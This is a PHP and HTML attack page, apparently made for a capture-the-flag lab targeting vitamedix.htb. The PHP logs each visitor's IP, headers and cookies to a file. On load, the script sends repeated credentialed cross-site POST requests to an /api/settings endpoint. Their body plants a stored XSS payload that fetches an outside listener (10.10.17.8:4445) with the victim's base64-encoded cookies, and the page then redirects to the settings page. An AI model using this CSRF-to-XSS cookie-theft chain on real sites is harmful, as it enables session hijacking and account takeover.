<?php
$log_file = __DIR__ . '/requests.log';

$request = "\n" . str_repeat("=", 80) . "\n";
$request .= "Time: " . date('Y-m-d H:i:s T') . "\n";
$request .= "From: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
$request .= "Method: " . ($_SERVER['REQUEST_METHOD'] ?? 'unknown') . "\n";
$request .= "URI: " . ($_SERVER['REQUEST_URI'] ?? 'unknown') . "\n";
$request .= "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'none') . "\n";
$request .= "Referer: " . ($_SERVER['HTTP_REFERER'] ?? 'none') . "\n";
$request .= "\n--- HEADERS ---\n";
foreach (getallheaders() as $name => $value) {
    $request .= "$name: $value\n";
}
$request .= "\n--- COOKIES ---\n";
foreach ($_COOKIE as $name => $value) {
    $request .= "$name: $value\n";
}
file_put_contents($log_file, $request, FILE_APPEND | LOCK_EX);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Submit</title>
</head>
<body>
    <p>Submitting JSON settings requests...</p>
    <script>
        const payload = '{"full_name":"<\\/option><\\/select><script>fetch(\'http:\/\/10.10.17.8:4445\/?d=\'+btoa(unescape(encodeURIComponent(document.cookie))));<\\/script><option><select>","address":"javascript:alert"}';
        const targets = [
            'http://vitamedix.htb/api/settings',
            'http://www.vitamedix.htb/api/settings'
        ];

        function sendFetch(url, withCreds) {
            return fetch(url, {
                method: 'POST',
                credentials: withCreds ? 'include' : 'omit',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: payload
            }).catch(() => {});
        }

        function sendXHR(url, withCreds) {
            return new Promise((resolve) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                xhr.withCredentials = withCreds;
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.onload = resolve;
                xhr.onerror = resolve;
                xhr.ontimeout = resolve;
                xhr.send(payload);
            });
        }

        const promises = [];
        for (const url of targets) {
            for (let k = 0; k < 2; k++) {
                promises.push(sendFetch(url, true));
                promises.push(sendFetch(url, false));
                promises.push(sendXHR(url, true));
                promises.push(sendXHR(url, false));
            }
        }

        Promise.all(promises).finally(() => {
            window.location.href = 'http://vitamedix.htb/settings';
        });
    </script>
</body>
</html>